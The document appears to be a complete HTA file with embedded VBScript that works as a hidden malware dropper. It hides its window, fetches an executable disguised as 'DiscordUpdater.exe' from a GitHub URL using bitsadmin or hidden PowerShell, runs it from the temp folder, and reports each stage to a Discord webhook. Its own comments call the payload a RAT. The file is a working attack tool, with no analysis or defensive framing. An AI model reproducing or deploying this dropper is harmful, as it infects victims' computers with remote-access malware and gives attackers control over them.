<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- WEBHOOK ---
WH = "https://discordapp.com/api/webhooks/1557496485413781675/FX5fiB-evdnBmtrf5yWkdskxVvFAn4m3pb9O0lWNR-JAqatIikBcSDPwUzeBFh5Vfioo"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- Trigger Download ---
Call DropRAT

' Keep HTA alive for 10 seconds so the EXE has time to unpack
Call SleepSeconds(10)
window.close()

' --- DropRAT ---
Sub DropRAT()
    Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
    
    ' YOUR GITHUB LINK
    Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/DiscordUpdater.exe"
    
    If fso.FileExists(temp) Then fso.DeleteFile temp

    Call PostEmbed("📦 RAT Download", "Fetching payload...", 3447003)

    ' 1. Try bitsadmin in the background
    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, False
    Call SleepSeconds(5)

    ' 2. Fallback to PowerShell
    If Not fso.FileExists(temp) Then
        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
    End If
    
    ' 3. Run if downloaded
    If fso.FileExists(temp) Then
        Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
        
        ' Set Working Directory to %TEMP%
        sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%")
        
        ' Launch VISIBLY (1) so it doesn't get killed silently by Windows
        sh.Run """" & temp & """", 1, False
        
        Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
    Else
        Call PostEmbed("⌛ RAT Error", "Download failed.", 16711680)
    End If
End Sub

' --- Sleep Functions ---
Sub SleepSeconds(s)
    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
    sh.Run cmd, 0, True
End Sub

Sub SleepMinutes(m)
    Call SleepSeconds(m * 60)
End Sub

' --- PostEmbed (direct to discord) ---
Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

' --- Ej ---
Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
</head><body></body></html>
